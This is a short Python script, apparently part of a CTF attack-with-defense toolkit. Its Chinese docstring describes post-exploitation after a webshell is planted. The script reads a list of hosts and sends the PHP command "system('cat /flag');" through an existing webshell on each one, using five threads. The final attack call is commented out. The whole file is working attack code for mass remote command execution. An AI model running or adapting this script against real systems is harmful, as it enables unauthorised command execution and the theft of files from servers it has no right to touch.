from utils.awd import AwdAttack,AwdTask
from utils.readwrite import readlines
from ..models import Example
from os.path import dirname
class Exp(AwdTask):
    """
    自定义一个Exp类，继承自AwdTask。覆写 attack_use_webshell()，主要于webshell种下之后的后渗透
    """

    def attack_use_webshell(self,host,port):
        resp = Example.test_available_and_eval(host,"system('cat /flag');")
        print(resp.text)

hosts = readlines(f"{dirname(__file__)}/../../hosts.txt")
attacker = AwdAttack(hosts=hosts,task_class=Exp,port=80,thread_num=5)
# attacker.attack()